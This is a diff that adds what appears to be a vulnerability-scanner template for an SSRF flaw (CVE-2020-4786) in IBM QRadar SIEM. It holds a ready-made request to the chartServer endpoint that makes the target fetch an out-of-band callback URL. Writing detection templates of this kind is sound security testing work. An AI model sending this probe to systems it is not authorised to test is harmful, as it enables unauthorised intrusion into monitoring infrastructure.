@@ -1,0 +1,19 @@
+id: IBM-QRadar-SIEM-CVE-2020-4786
+
+info:
+  name: IBM QRadar SIEM (CVE-2020-4786)
+  author: hacktifycs
+  severity: medium
+  description: Attacker is able to acheive SSRF in the vulnerable version of IBM QRadar SIEM by exploiting (CVE-2020-4786)
+  reference: unknown
+  tags: siem,ibm,qradar,ssrf,oob
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/console/chartServer?output=image&data=https://{{interactsh-url}}/'
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the HTTP Interaction
+        words:
+          - "http"
